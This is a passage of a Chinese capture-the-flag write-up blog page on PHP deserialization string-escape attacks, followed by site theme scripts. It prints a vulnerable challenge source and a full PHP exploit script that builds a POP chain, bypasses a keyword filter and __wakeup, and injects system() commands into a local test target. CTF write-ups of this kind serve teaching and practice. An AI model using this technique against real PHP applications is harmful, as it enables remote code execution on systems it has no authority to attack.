+    <span class="k">public</span> <span class="nv">$p1</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$p2</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s2">"system(</span><span class="se">\"</span><span class="s2">ls</span><span class="se">\"</span><span class="s2">);"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Challenge</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">),</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">// O:9:"Challenge":3:{s:2:"p1";s:0:"";s:2:"p2";s:0:"";s:3:"key";s:13:"system("ls");";}</span>
+</code></pre></div></div>
+
+<p>总的来说就是利用长度变小使得 p1 将 p2 的内容给吞掉,然后 p2 处注入 key 的内容.</p>
+<ol>
+  <li>p2 需要构造的内容为 :<code class="language-plaintext highlighter-rouge">";s:3:"key";s:13:"system("ls");";}</code>, 此时 p2 序列化的内容为: <code class="language-plaintext highlighter-rouge">s:2:"p2";s:34:"";s:3:"key";s:13:"system("ls");";}"</code></li>
+  <li>p1 需要将 p2 前半段给吞掉,也就是 <code class="language-plaintext highlighter-rouge">";s:2:"p2";s:34:"</code> 长度为 17 ,因此需要构造 17 个 where 替换为 nono.</li>
+</ol>
+
+<p>exp.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$p1</span> <span class="o">=</span> <span class="mi">17</span><span class="o">*</span><span class="s2">"where"</span><span class="p">;</span>
+<span class="nv">$p2</span> <span class="o">=</span> <span class="s1">'";s:3:"key";s:13:"system("ls");";}'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h1 id="其他题目">其他题目</h1>
+
+<h2 id="强网杯-2021-web-辅助">强网杯 2021 web 辅助</h2>
+
+<p>class.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">player</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$user</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$pass</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$admin</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$admin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">pass</span> <span class="o">=</span> <span class="nv">$pass</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">admin</span> <span class="o">=</span> <span class="nv">$admin</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">get_admin</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">admin</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">topsolo</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">'Riven'</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">TP</span><span class="p">(){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">gettype</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"function"</span> <span class="k">or</span> <span class="nb">gettype</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"object"</span><span class="p">){</span>
+            <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">;</span>
+            <span class="nv">$name</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">TP</span><span class="p">();</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">midsolo</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">!==</span> <span class="s1">'Yasuo'</span><span class="p">){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="s1">'Yasuo'</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">"No Yasuo! No Soul!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__invoke</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">Gank</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">Gank</span><span class="p">(){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s1">'Yasuo'</span><span class="p">)){</span>
+            <span class="k">echo</span> <span class="s2">"Are you orphan?</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"Must Be Yasuo!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">jungle</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s2">"Lee Sin"</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">KS</span><span class="p">(){</span>
+        <span class="nb">system</span><span class="p">(</span><span class="s2">"cat /flag"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__toString</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">KS</span><span class="p">();</span>  
+        <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>  
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>common.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="n">read</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\0*\0'</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="mf">.</span><span class="s2">"*"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="mf">.</span><span class="s2">"*"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">'\0*\0'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">check</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">)</span><span class="o">!==</span><span class="kc">False</span><span class="p">){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Name Pass</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ol>
+  <li>pop链中的变量都变成了 protected，反序列化时需格外注意。</li>
+  <li>read 函数有变化，字符是从5个减小到3个。</li>
+  <li>绕过对于 name 的过滤，可以使用十六进制，然后使用S进行转义处理。否则无法正确处理十六进制</li>
+  <li>绕过 __wakeup。</li>
+</ol>
+
+<p>利用脚本</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">player</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$user</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$pass</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$admin</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$admin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">pass</span> <span class="o">=</span> <span class="nv">$pass</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">admin</span> <span class="o">=</span> <span class="nv">$admin</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">topsolo</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">'Riven'</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">midsolo</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">jungle</span>
+<span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s2">"Lee Sin"</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="k">function</span> <span class="n">console</span><span class="p">(</span><span class="nv">$line</span><span class="p">){</span>
+    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/name/'</span><span class="p">,</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$i</span><span class="p">])){</span>
+            <span class="nv">$arr</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"name"</span><span class="p">,</span><span class="s1">'\6e\61\6d\65'</span><span class="p">,</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+            <span class="nv">$arr</span><span class="p">[</span><span class="nv">$i</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'s'</span><span class="p">,</span><span class="s1">'S'</span><span class="p">,</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$i</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span><span class="s1">':'</span><span class="p">);</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"midsolo":1:'</span><span class="p">,</span><span class="s1">'"midsolo":2:'</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">pad</span><span class="p">(</span><span class="nv">$poc</span><span class="p">){</span>
+    <span class="nv">$pad</span> <span class="o">=</span> <span class="s1">'";s:7:" * pass";s:111:"0'</span><span class="p">;</span>
+    <span class="nv">$username</span> <span class="o">=</span> <span class="s1">'drom'</span><span class="mf">.</span><span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'\0*\0'</span><span class="p">,(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$pad</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'0'</span><span class="mf">.</span><span class="s1">'";s:4:"drom";'</span><span class="mf">.</span><span class="nv">$poc</span><span class="mf">.</span><span class="s1">'s:8:"\0*\0admin";i:0;}'</span><span class="p">;</span>
+    <span class="nv">$args</span> <span class="o">=</span> <span class="s1">'?username='</span><span class="mf">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span><span class="mf">.</span><span class="s1">'&amp;password='</span><span class="mf">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$args</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">CURL</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$tmp</span>  <span class="o">=</span> <span class="nf">console</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">topsolo</span><span class="p">(</span><span class="k">new</span> <span class="nc">midsolo</span><span class="p">(</span><span class="k">new</span> <span class="nc">jungle</span><span class="p">()))));</span>
+<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://127.0.0.1/qw/webfuzhu/html/'</span><span class="p">;</span>
+<span class="nf">CURL</span><span class="p">(</span><span class="nv">$url</span><span class="mf">.</span><span class="nf">pad</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
+<span class="k">echo</span> <span class="nf">CURL</span><span class="p">(</span><span class="nv">$url</span><span class="mf">.</span><span class="s1">'play.php'</span><span class="p">);</span>
+</code></pre></div></div>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-06-08T06:06:45+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87.html">php 反序列化绕过</a></div><div class="next"><span>NEXT</span><a href="/php/2023/06/08/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8.html">php phar 反序列化利用</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
